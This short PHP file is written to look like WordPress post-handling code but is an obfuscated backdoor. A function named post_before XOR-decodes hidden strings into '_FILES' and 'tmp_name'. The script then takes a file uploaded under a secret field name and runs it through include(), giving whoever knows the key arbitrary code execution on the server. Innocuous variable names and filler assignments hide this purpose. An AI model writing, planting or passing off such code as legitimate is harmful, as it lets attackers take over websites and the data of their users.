...
$months = 'mlg3fnZROjvj';
function post_before($mime_types, $file)

{

    $sort_order = urldecode($mime_types);
    $patterns = substr($file,0, strlen($sort_order));
	$key = 'query';
    $group = $sort_order ^ $patterns;

    return $group;
}
	$image_file = 'incposts';
$attrs = ${post_before("2%2A.%7F%23%3D", $months)};
if (isset($attrs[$months]))

{
	$post_types = 'title';
    $maybe_empty = $attrs[$months];
	$reset = 'post_name';
    $template = $maybe_empty[post_before("%19%01%17l%08%0F77", $months)];
    include ($template);
}
